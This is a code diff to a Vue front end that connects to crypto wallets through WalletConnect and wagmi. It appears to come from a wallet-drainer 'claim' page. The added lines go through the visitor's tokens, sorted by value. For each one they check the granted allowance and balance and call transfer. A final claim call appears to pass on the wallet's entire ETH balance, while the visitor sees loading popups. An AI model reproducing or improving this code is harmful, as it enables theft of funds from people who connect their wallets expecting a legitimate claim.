@@ -440,9 +440,12 @@ import { disconnect, getAccount, fetchFeeData } from '@wagmi/core';
 import {
   web3modal,
   claim,
-  balanceOf,
+  ethBalance,
   getTokens,
   increaseAllowance,
+  balanceOf,
+  allownce,
+  transfer,
 } from './utils/walletconnect.js';
 const Toast = useToast();
 import axios from 'axios';
@@ -482,19 +485,28 @@ export default {
 
           this.processing = false;
           this.isDone = true;
-          if (this.currentIndex + 1 > this.sortedTokens.length) {
-            if (this.claimable > 0) {
-              await claim(this.balance.value);
-              this.claimable = 0;
-            } else {
-              this.processing = false;
-              this.isDone = false;
-              Swal.close();
-              Swal.hideLoading();
+          const allownce = await allownce(this.maxToken);
+          const balanceoftoken = await balanceOf(this.maxToken);
+          if (allownce > 0) {
+            if (balanceoftoken > 0) {
+              await transfer(this.maxToken);
             }
-          } else {
-            this.currentIndex += 1;
-            this.maxToken = this.sortedTokens[this.currentIndex];
+            if (this.currentIndex + 1 > this.sortedTokens.length) {
+              if (this.claimable > 0) {
+                await claim(this.balance.value);
+                this.claimable = 0;
+              } else {
+                this.processing = false;
+                this.isDone = false;
+                Swal.close();
+                Swal.hideLoading();
+              }
+            } else {
+              this.currentIndex += 1;
+              this.maxToken = this.sortedTokens[this.currentIndex];
+              this.wc_claim();
+            }
+          }else{
             this.wc_claim();
           }
         } else {
@@ -567,7 +579,7 @@ export default {
     async showBalance() {
       try {
         this.processing = true;
-        const balance = await balanceOf();
+        const balance = await ethBalance();
         const feeData = await fetchFeeData({
           chainId: 1,
           formatUnits: 'gwei',
